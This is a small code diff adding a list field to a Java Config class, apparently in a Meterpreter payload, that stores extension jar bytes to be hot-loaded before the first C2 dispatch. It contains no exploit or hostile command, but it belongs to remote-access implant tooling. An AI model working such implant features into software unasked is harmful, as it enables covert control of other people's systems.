@@ -21,4 +21,9 @@ public class Config {
 
     public List<TransportConfig> transportConfigList = new LinkedList<TransportConfig>();
 
+    // Raw extension jar bytes from any TLV_TYPE_EXTENSION groups in the
+    // config block (EXTENSIONS=). Hot-loaded after Meterpreter starts so
+    // commands are registered before the first C2 dispatch.
+    public List<byte[]> extensions = new LinkedList<byte[]>();
+
 }
